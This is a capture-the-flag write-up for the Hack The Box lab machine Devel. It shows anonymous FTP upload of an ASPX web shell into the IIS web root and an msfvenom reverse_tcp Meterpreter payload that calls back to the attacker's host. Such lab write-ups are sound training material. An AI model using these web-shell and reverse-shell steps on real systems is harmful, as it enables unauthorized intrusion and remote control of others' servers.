# Hack The Box - Devel

| Machine | OS | Difficulty |
|---------|----|------------|
| Devel | Windows | Easy |

---

# Overview

Devel is a beginner-friendly Windows machine that demonstrates the dangers of insecure file upload mechanisms. The target exposes an FTP service with anonymous authentication enabled, allowing arbitrary file uploads into the IIS web root. By uploading an ASPX web shell, remote command execution is obtained. A Meterpreter payload is then uploaded to gain a stable shell, followed by privilege escalation using the MS10-015 KiTrap0D vulnerability to obtain SYSTEM privileges.

---

# Enumeration

## Nmap Scan

A service scan reveals only two accessible services.

```bash
nmap -sC -sV -oN nmap_scan 10.129.242.143
```

### Result

```
21/tcp open  ftp
80/tcp open  http
```

### Service Details

| Port | Service | Version |
|------|----------|----------|
|21|FTP|Microsoft ftpd|
|80|HTTP|Microsoft IIS 7.5|

Notable observations:

- Anonymous FTP login is enabled.
- IIS 7.5 is hosting the web application.
- TRACE method is enabled.

---

## Anonymous FTP Enumeration

Connect to the FTP service.

```bash
ftp 10.129.242.143
```

Login anonymously.

```
Username: anonymous
Password:
```

Login succeeds immediately.

List the contents.

```text
ftp> ls
```

Output:

```
aspnet_client/
iisstart.htm
welcome.png
```

The FTP server appears to expose the IIS web root, making it an ideal target for uploading ASP.NET files.

---

# Web Enumeration

Browse to the web server.

```
http://10.129.242.143
```

The default IIS7 landing page is displayed.

Since IIS is serving the same files observed through FTP, anything uploaded through FTP should become directly accessible via HTTP.

This strongly suggests a writable web root.

---

# Initial Access

## Using an ASPX Command Shell

Kali already provides a lightweight ASP.NET command execution web shell.

Location:

```bash
cd /usr/share/webshells/aspx
```

Files available include:

```
cmdasp.aspx
```

Copy the shell into the working directory.

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

---

## Upload the Web Shell

Reconnect to FTP.

```bash
ftp 10.129.242.143
```

Upload the shell.

```text
put cmdasp.aspx
```

Verify the upload.

```
ftp> ls

aspnet_client/
cmdasp.aspx
iisstart.htm
welcome.png
```

The upload completes successfully.

---

## Remote Command Execution

Open the uploaded shell.

```
http://10.129.242.143/cmdasp.aspx
```

The page provides a simple interface capable of executing arbitrary Windows commands.

Example:

```
dir
```

The response displays the contents of:

```
C:\Windows\System32\inetsrv
```

Further enumeration confirms command execution on the target.

Examples:

```
dir C:\

dir C:\Users

dir C:\inetpub

dir C:\inetpub\wwwroot
```

Attempts to access:

```
C:\Users\Administrator
```

or

```
C:\Users\babis
```

return **Access Denied**, indicating that the current IIS worker process is running with limited privileges.

---

# Obtaining a Stable Shell

While the command shell is useful for enumeration, it is cumbersome for post-exploitation. A Meterpreter session provides a far more reliable and feature-rich environment.

Generate an ASPX Meterpreter payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.160 \
LPORT=8888 \
-f aspx \
> devel.aspx
```

Configure a Metasploit listener.

```text
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 8888

run
```

Upload the generated payload through FTP.

```text
put devel.aspx
```

The upload succeeds successfully.

Trigger the payload by visiting:

```
http://10.129.242.143/devel.aspx
```

Metasploit receives a reverse connection.

```
Meterpreter session 1 opened
```

A stable Meterpreter shell is now established, providing a solid foothold for local enumeration and privilege escalation.
